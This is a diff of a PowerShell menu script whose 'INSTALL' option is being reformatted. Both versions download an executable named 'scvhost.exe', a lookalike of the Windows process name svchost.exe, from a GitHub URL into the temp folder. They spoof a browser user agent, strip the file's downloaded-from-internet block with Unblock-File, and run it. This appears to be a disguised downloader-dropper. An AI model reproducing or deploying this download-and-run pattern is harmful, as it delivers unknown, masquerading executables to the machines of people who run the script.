@@ -118,63 +118,41 @@ while ($true)
     # INSTALL
     # =========================
 
-    if ($choice -eq "1")
-    {
-        Clear-Host
-        Show-Header
+ if ($choice -eq "1")
+{
+    Clear-Host
+    Show-Header
 
-        Write-Console "DOWNLOADING..." "INFO"
+    Write-Console "DOWNLOADING..." "INFO"
 
-$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
-$path = "$env:TEMP\scuhost.exe"
+    $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
+    $path = "$env:TEMP\scvhost.exe"
 
-try {
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $wc = New-Object Net.WebClient
+        $wc.Headers.Add("User-Agent","Mozilla/5.0")
+        $wc.DownloadFile($url, $path)
 
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent","Mozilla/5.0")
-
-    $wc.DownloadFile($url, $path)
-
-    Start-Sleep 1
-
-    if (Test-Path $path)
-    {
-        Write-Host ""
-
-        Write-Console "INSTALL SUCCESS" "SUCCESS"
-
-        Unblock-File $path -ErrorAction SilentlyContinue
-
-        Start-Process $path
+        if (Test-Path $path) {
+            Write-Console "INSTALL SUCCESS" "SUCCESS"
+            Unblock-File $path -ErrorAction SilentlyContinue
+            Start-Process $path
+        }
+        else {
+            Write-Console "INSTALL FAILED" "NO KEY"
+        }
     }
-    else
-    {
+    catch {
         Write-Host ""
-
+        Write-Host $_.Exception.Message -ForegroundColor Red
         Write-Console "INSTALL FAILED" "NO KEY"
     }
-}
-catch {
 
     Write-Host ""
-    Write-Host $_.Exception.Message -ForegroundColor Red
-
-    Write-Console "INSTALL FAILED" "NO KEY"
+    Pause
 }
-}
-catch {
-
-    Write-Host ""
-    Write-Host $_.Exception.Message -ForegroundColor Red
-
-    Write-Console "INSTALL FAILED" "NO KEY"
-}
-        Write-Host ""
-        Pause
-    }
-
     # =========================
     # CLEAN
     # =========================
